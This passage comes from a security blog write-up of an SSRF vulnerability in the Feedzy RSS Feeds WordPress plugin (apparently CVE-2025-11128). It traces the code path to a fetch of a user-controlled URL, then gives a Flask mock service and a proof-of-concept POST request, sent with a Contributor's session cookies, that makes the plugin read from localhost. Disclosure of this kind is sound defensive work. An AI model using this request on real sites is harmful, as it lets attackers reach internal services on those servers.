start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Check for RSS fetch errors&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $feed-&amp;gt;init() ) {&#xA;    $feedy[&amp;#39;error&amp;#39;] = __( &amp;#39;Invalid Feed URL&amp;#39;, &amp;#39;feedzy-rss-feeds&amp;#39; );&#xA;    return $feedy;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If &lt;code&gt;init()&lt;/code&gt; fails → returns JSON error &lt;code&gt;&amp;quot;Invalid Feed URL&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Extract channel information&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ... ) {&#xA;    $feedy[&amp;#39;channel&amp;#39;] = null;&#xA;} else {&#xA;    $feedy[&amp;#39;channel&amp;#39;] = array(&#xA;        &amp;#39;title&amp;#39; =&amp;gt; $feed-&amp;gt;get_title(),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; $feed-&amp;gt;get_description(),&#xA;        &amp;#39;permalink&amp;#39; =&amp;gt; $feed-&amp;gt;get_permalink(),&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If the feed has no title → set &lt;code&gt;null&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Otherwise → create a standard channel info object (title, description, link).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Iterate through each item in the feed&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $items as $item ) {&#xA;    $item_attrs = apply_filters( &amp;#39;feedzy_item_filter&amp;#39;, array(), $item );&#xA;    array_push(&#xA;        $feedy[&amp;#39;items&amp;#39;],&#xA;        array(&#xA;            &amp;#39;title&amp;#39;       =&amp;gt; ( ( $item-&amp;gt;get_title() ) ? $item-&amp;gt;get_title() : null ),&#xA;            &amp;#39;link&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_permalink() ) ? $item-&amp;gt;get_permalink() : null ),&#xA;            &amp;#39;creator&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_author() ) ? $item-&amp;gt;get_author()-&amp;gt;get_name() : null ),&#xA;            &amp;#39;source&amp;#39;      =&amp;gt; $is_multiple &amp;amp;&amp;amp; $item-&amp;gt;get_feed()-&amp;gt;get_title() ? $item-&amp;gt;get_feed()-&amp;gt;get_title() : &amp;#39;&amp;#39;,&#xA;            &amp;#39;pubDate&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) : null ),&#xA;            &amp;#39;date&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;date_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;            &amp;#39;time&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;time_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;            &amp;#39;description&amp;#39; =&amp;gt; isset( $item_attrs[&amp;#39;item_description&amp;#39;] ) ? $item_attrs[&amp;#39;item_description&amp;#39;] : ( $item-&amp;gt;get_description() ? $item-&amp;gt;get_description() : null ),&#xA;            &amp;#39;thumbnail&amp;#39;   =&amp;gt; $admin-&amp;gt;feedzy_retrieve_image( $item ),&#xA;            &amp;#39;default_img&amp;#39; =&amp;gt; apply_filters( &amp;#39;feedzy_default_image&amp;#39;, &amp;#39;&amp;#39;, $url ),&#xA;            &amp;#39;price&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_price&amp;#39;] ) ? $item_attrs[&amp;#39;item_price&amp;#39;] : null,&#xA;            &amp;#39;media&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_media&amp;#39;] ) ? $item_attrs[&amp;#39;item_media&amp;#39;] : null,&#xA;            &amp;#39;categories&amp;#39;  =&amp;gt; isset( $item_attrs[&amp;#39;item_categories&amp;#39;] ) ? $item_attrs[&amp;#39;item_categories&amp;#39;] : null,&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;Return JSON result&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;return $feedy;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Each post (item) is extracted and mapped into a JSON array containing: title, link, author, date, description, thumbnail, etc.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;The returned content contains the specified fields → This shows the data fetched from the URL is a structured file containing the above fields, so we cannot read an arbitrary file.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;We analyze &lt;code&gt;fetch_feed()&lt;/code&gt; to see what file it actually reads:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function fetch_feed( $feed_url, $cache = &amp;#39;12_hours&amp;#39;, $sc = &amp;#39;&amp;#39; ) {&#xA;    // Load SimplePie if not already.&#xA;    do_action( &amp;#39;feedzy_pre_http_setup&amp;#39;, $feed_url );&#xA;    if ( function_exists( &amp;#39;feedzy_amazon_get_locale_hosts&amp;#39; ) ) {&#xA;        $amazon_hosts     = feedzy_amazon_get_locale_hosts();&#xA;        $is_amazon_source = false;&#xA;        if ( is_array( $feed_url ) ) {&#xA;            $url_host         = array_map(&#xA;                function ( $url ) {&#xA;                    return &amp;#39;webservices.&amp;#39; . wp_parse_url( $url, PHP_URL_HOST );&#xA;                },&#xA;                $feed_url&#xA;            );&#xA;            $url_host         = array_diff( $url_host, $amazon_hosts );&#xA;            $is_amazon_source = ! empty( $amazon_hosts ) &amp;amp;&amp;amp; empty( $url_host );&#xA;        } else {&#xA;            $url_host         = &amp;#39;webservices.&amp;#39; . wp_parse_url( $feed_url, PHP_URL_HOST );&#xA;            $is_amazon_source = ! empty( $amazon_hosts ) &amp;amp;&amp;amp; in_array( $url_host, $amazon_hosts, true );&#xA;        }&#xA;        if ( $is_amazon_source ) {&#xA;            $feed = $this-&amp;gt;init_amazon_api(&#xA;                $feed_url,&#xA;                isset( $sc[&amp;#39;refresh&amp;#39;] ) ? $sc[&amp;#39;refresh&amp;#39;] : &amp;#39;12_hours&amp;#39;,&#xA;                array(&#xA;                    &amp;#39;number_of_item&amp;#39; =&amp;gt; isset( $sc[&amp;#39;max&amp;#39;] ) ? $sc[&amp;#39;max&amp;#39;] : 5,&#xA;                    &amp;#39;no-cache&amp;#39;       =&amp;gt; false,&#xA;                )&#xA;            );&#xA;            return $feed;&#xA;        }&#xA;    }&#xA;    // Load SimplePie Instance.&#xA;    $feed = $this-&amp;gt;init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.&#xA;&#xA;    // Report error when is an error loading the feed.&#xA;    if ( is_wp_error( $feed ) ) {&#xA;        // Fallback for different edge cases.&#xA;        if ( is_array( $feed_url ) ) {&#xA;            $feed_url = array_map( &amp;#39;html_entity_decode&amp;#39;, $feed_url );&#xA;        } else {&#xA;            $feed_url = html_entity_decode( $feed_url );&#xA;        }&#xA;&#xA;        $feed_url = $this-&amp;gt;get_valid_source_urls( $feed_url, $cache );&#xA;&#xA;        $feed = $this-&amp;gt;init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.&#xA;&#xA;    }&#xA;&#xA;    do_action( &amp;#39;feedzy_post_http_teardown&amp;#39;, $feed_url );&#xA;&#xA;    return $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;feedzy_amazon_get_locale_hosts&lt;/code&gt; exists then it executes the logic inside the &lt;code&gt;if&lt;/code&gt; and returns &lt;code&gt;$feed&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( function_exists( &amp;#39;feedzy_amazon_get_locale_hosts&amp;#39; ) ) {&#xA;    ...&#xA;    return $feed&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Searching for &lt;code&gt;feedzy_amazon_get_locale_hosts&lt;/code&gt; across the plugin directory shows that this function &lt;strong&gt;is not declared or defined anywhere&lt;/strong&gt;.&#xA;Therefore, the check &lt;code&gt;if ( function_exists( &#39;feedzy_amazon_get_locale_hosts&#39; ) )&lt;/code&gt; will always &lt;strong&gt;return &lt;code&gt;false&lt;/code&gt;&lt;/strong&gt;, causing that branch to be &lt;strong&gt;skipped&lt;/strong&gt; and execution to &lt;strong&gt;continue to call &lt;code&gt;init_feed()&lt;/code&gt;&lt;/strong&gt; then &lt;strong&gt;check for errors&lt;/strong&gt; and return the feed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/function.png&#34; title=&#34;Search result for feedzy_amazon_get_locale_hosts&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/function.png&#34; data-sub-html=&#34;&lt;h2&gt;Function&lt;/h2&gt;&lt;p&gt;Search result for feedzy_amazon_get_locale_hosts&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/function.png&#39; alt=&#34;Function&#34; height=&#34;454&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search result for feedzy_amazon_get_locale_hosts&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function init_feed( $feed_url, $cache, $sc, $allow_https = FEEDZY_ALLOW_HTTPS ) {&#xA;    ...&#xA;    $feed = new Feedzy_Rss_Feeds_Util_SimplePie( $sc );&#xA;    $feed-&amp;gt;set_file_class( &amp;#39;WP_SimplePie_File&amp;#39; );&#xA;    $default_agent = $this-&amp;gt;get_default_user_agent( $feed_url );&#xA;    $feed-&amp;gt;set_useragent( apply_filters( &amp;#39;http_headers_useragent&amp;#39;, $default_agent ) );&#xA;   &#xA;&#xA;    // Do not use force_feed for multiple URLs.&#xA;    $feed-&amp;gt;force_feed( apply_filters( &amp;#39;feedzy_force_feed&amp;#39;, ( is_string( $feed_url ) || ( is_array( $feed_url ) &amp;amp;&amp;amp; 1 === count( $feed_url ) ) ) ) );&#xA;&#xA;    do_action( &amp;#39;feedzy_modify_feed_config&amp;#39;, $feed );&#xA;&#xA;    $cloned_feed = clone $feed;&#xA;&#xA;    // set the url as the last step, because we need to be able to clone this feed without the url being set&#xA;    // so that we can fall back to raw data in case of an error.&#xA;    $feed-&amp;gt;set_feed_url( $feed_url );&#xA;&#xA;    // Allow unsafe html.&#xA;    if ( defined( &amp;#39;FEEDZY_ALLOW_UNSAFE_HTML&amp;#39; ) &amp;amp;&amp;amp; FEEDZY_ALLOW_UNSAFE_HTML ) {&#xA;        $feed-&amp;gt;strip_htmltags( false );&#xA;    }&#xA;&#xA;    if ( isset( $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] ) ) {&#xA;        // phpcs:ignore WordPressVIPMinimum.Variables.RestrictedVariables.cache_constraints___SERVER__HTTP_USER_AGENT__&#xA;        $set_server_agent = sanitize_text_field( wp_unslash( $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] ) . SIMPLEPIE_USERAGENT );&#xA;        $feed-&amp;gt;set_useragent( apply_filters( &amp;#39;http_headers_useragent&amp;#39;, $set_server_agent ) );&#xA;    }&#xA;&#xA;    $feed-&amp;gt;init();&#xA;&#xA;    ...&#xA;    return $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;init_feed()&lt;/code&gt; function is responsible for initializing and configuring the &lt;strong&gt;SimplePie&lt;/strong&gt; object, setting up some basic info, and calling &lt;code&gt;$feed-&amp;gt;init()&lt;/code&gt; to issue the request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init() {&#xA;    // Check absolute bare minimum requirements.&#xA;    if (!extension_loaded(&amp;#39;xml&amp;#39;) || !extension_loaded(&amp;#39;pcre&amp;#39;)) {&#xA;        $this-&amp;gt;error = &amp;#39;XML or PCRE extensions not loaded!&amp;#39;;&#xA;        return false;&#xA;    }&#xA;    // Then check the xml extension is sane (i.e., libxml 2.7.x issue on PHP &amp;lt; 5.2.9 and libxml 2.7.0 to 2.7.2 on any version) if we don&amp;#39;t have xmlreader.&#xA;    elseif (!extension_loaded(&amp;#39;xmlreader&amp;#39;)) {&#xA;        static $xml_is_sane = null;&#xA;        if ($xml_is_sane === null) {&#xA;            $parser_check = xml_parser_create();&#xA;            xml_parse_into_struct($parser_check, &amp;#39;&amp;lt;foo&amp;gt;&amp;amp;amp;&amp;lt;/foo&amp;gt;&amp;#39;, $values);&#xA;            xml_parser_free($parser_check);&#xA;            $xml_is_sane = isset($values[0][&amp;#39;value&amp;#39;]);&#xA;        }&#xA;        if (!$xml_is_sane) {&#xA;            return false;&#xA;        }&#xA;    }&#xA;    ...&#xA;    if ($this-&amp;gt;feed_url === null &amp;amp;&amp;amp; $this-&amp;gt;raw_data === null) {&#xA;        return false;&#xA;    }&#xA;&#xA;    $cache = false;&#xA;    if ($this-&amp;gt;enable_cache) {&#xA;        $cache = $this-&amp;gt;get_cache($this-&amp;gt;feed_url);&#xA;    }&#xA;    if (($fetched = $this-&amp;gt;fetch_data($cache)) === true) {&#xA;        return true;&#xA;    } elseif ($fetched === false) {&#xA;        return false;&#xA;    }&#xA;&#xA;    [$headers, $sniffed] = $fetched;&#xA;&#xA;    if (empty($this-&amp;gt;raw_data)) {&#xA;        $this-&amp;gt;error = &amp;#34;Empty response from `$this-&amp;gt;feed_url`&amp;#34;;&#xA;        return false;&#xA;    }&#xA;&#xA;    // Parse&#xA;    foreach ($this-&amp;gt;get_possible_encodings($headers, $sniffed) as $encoding) {&#xA;        $utf8_data = $this-&amp;gt;convert_to_utf8($this-&amp;gt;raw_data, $encoding);&#xA;        $parser = $this-&amp;gt;registry-&amp;gt;create(Parser::class);&#xA;        if ($parser-&amp;gt;parse($utf8_data, &amp;#39;UTF-8&amp;#39;, $this-&amp;gt;permanent_url)) {&#xA;            $this-&amp;gt;data = $parser-&amp;gt;get_data();&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; We see the requested file is expected to be XML&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;fetch_data($cache)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is where the HTTP request to the user-supplied URL is performed.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User input via /feedzy/v1/feed (REST API)&amp;#34;] --&amp;gt; B[&amp;#34;feedzy_sanitize_feeds()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;esc_url() → no internal host validation&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;feedzy_rest_route()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Feedzy_Rss_Feeds::instance()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;$admin-&amp;gt;fetch_feed(url)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;feedzy_amazon_get_locale_hosts() exists?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;init_feed()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Feedzy_Rss_Feeds_Util_SimplePie::init()&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;fetch_data(cache)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;HTTP request to user-controlled URL → SSRF&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service using Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, request, send_from_directory, Response&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/feed&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def feed():&#xA;    xml_content = &amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;    &amp;lt;rss version=&amp;#34;2.0&amp;#34;&amp;gt;&#xA;      &amp;lt;channel&amp;gt;&#xA;        &amp;lt;title&amp;gt;Example Feed&amp;lt;/title&amp;gt;&#xA;        &amp;lt;link&amp;gt;https://example.com&amp;lt;/link&amp;gt;&#xA;        &amp;lt;description&amp;gt;This is a sample RSS feed generated by Flask.&amp;lt;/description&amp;gt;&#xA;        &amp;lt;item&amp;gt;&#xA;          &amp;lt;title&amp;gt;First item&amp;lt;/title&amp;gt;&#xA;          &amp;lt;link&amp;gt;https://example.com/item1&amp;lt;/link&amp;gt;&#xA;          &amp;lt;description&amp;gt;Hello world!&amp;lt;/description&amp;gt;&#xA;        &amp;lt;/item&amp;gt;&#xA;        &amp;lt;item&amp;gt;&#xA;          &amp;lt;title&amp;gt;Second item&amp;lt;/title&amp;gt;&#xA;          &amp;lt;link&amp;gt;https://example.com/item2&amp;lt;/link&amp;gt;&#xA;          &amp;lt;description&amp;gt;Another entry.&amp;lt;/description&amp;gt;&#xA;        &amp;lt;/item&amp;gt;&#xA;      &amp;lt;/channel&amp;gt;&#xA;    &amp;lt;/rss&amp;gt;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    return Response(xml_content, mimetype=&amp;#39;application/xml&amp;#39;)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with a Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Send a POST request with the URL pointing to the local service:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/feedzy/v1/feed HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F&amp;amp;reauth=1&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US&#xA;&#xA;url[0]=http://localhost:8001/feed&amp;amp;category=cat&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/result.png&#34; title=&#34;Content read from the local service&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Content read from the local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/result.png&#39; alt=&#34;Result&#34; height=&#34;938&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content read from the local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;If trying &lt;code&gt;url&lt;/code&gt; with a file that is not XML, we get the response:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/metadata.png&#34; title=&#34;Result when file is not an XML&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/metadata.png&#34; data-sub-html=&#34;&lt;h2&gt;Metadata&lt;/h2&gt;&lt;p&gt;Result when file is not an XML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/metadata.png&#39; alt=&#34;Metadata&#34; height=&#34;569&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result when file is not an XML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 